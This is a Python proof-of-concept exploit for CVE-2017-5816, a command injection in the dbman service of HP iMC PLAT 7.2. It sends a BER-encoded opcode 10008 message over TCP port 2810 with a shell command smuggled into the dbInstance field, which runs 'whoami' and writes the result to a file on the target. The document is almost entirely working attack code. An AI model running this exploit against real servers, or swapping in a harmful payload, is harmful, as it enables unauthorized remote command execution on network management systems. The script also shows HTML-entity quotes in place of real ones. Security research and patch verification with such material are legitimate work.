 
# Exploit Title: HP iMC Plat 7.2 dbman Opcode 10008 Command Injection RCE
# Exploit Author: Chris Lyne (@lynerc)
# Vendor Homepage: www.hpe.com
# Software Link: https://h10145.www1.hpe.com/Downloads/DownloadSoftware.aspx?SoftwareReleaseUId=16759&ProductNumber=JG747AAE&lang=en&cc=us&prodSeriesId=4176535&SaidNumber=
# Version: iMC PLAT v7.2 (E0403) Standard
# Tested on: Windows Server 2008 R2 Enterprise 64-bit
# CVE : CVE-2017-5816
# See Also: http://www.zerodayinitiative.com/advisories/ZDI-17-340/
 
# note that this PoC will create a file &#039;C:\10008.txt&#039;
 
from pyasn1.type.univ import *
from pyasn1.type.namedtype import *
from pyasn1.codec.ber import encoder
import struct
import binascii
import socket, sys
 
ip = &#039;192.168.1.74&#039;
port = 2810
payload = "whoami > C:\\10008.txt"
opcode = 10008
 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))
 
class DbmanMsg(Sequence):
    componentType = NamedTypes(
        NamedType(&#039;dbIp&#039;, OctetString()),
        NamedType(&#039;iDBType&#039;, Integer()),
        NamedType(&#039;dbInstance&#039;, OctetString()),
        NamedType(&#039;dbSaUserName&#039;, OctetString()),
        NamedType(&#039;dbSaPassword&#039;, OctetString()),
        NamedType(&#039;strOraDbIns&#039;, OctetString())
    )
 
msg = DbmanMsg()
 
msg[&#039;dbIp&#039;] = ip
msg[&#039;iDBType&#039;] = 4
msg[&#039;dbInstance&#039;] = "a\"& " + payload + " &"
msg[&#039;dbSaUserName&#039;] = "b"
msg[&#039;dbSaPassword&#039;] = "c"
msg[&#039;strOraDbIns&#039;] = "d"
 
encodedMsg = encoder.encode(msg, defMode=True)
msgLen = len(encodedMsg)
values = (opcode, msgLen, encodedMsg)
s = struct.Struct(">ii%ds" % msgLen)
packed_data = s.pack(*values)
 
sock.send(packed_data)
sock.close()

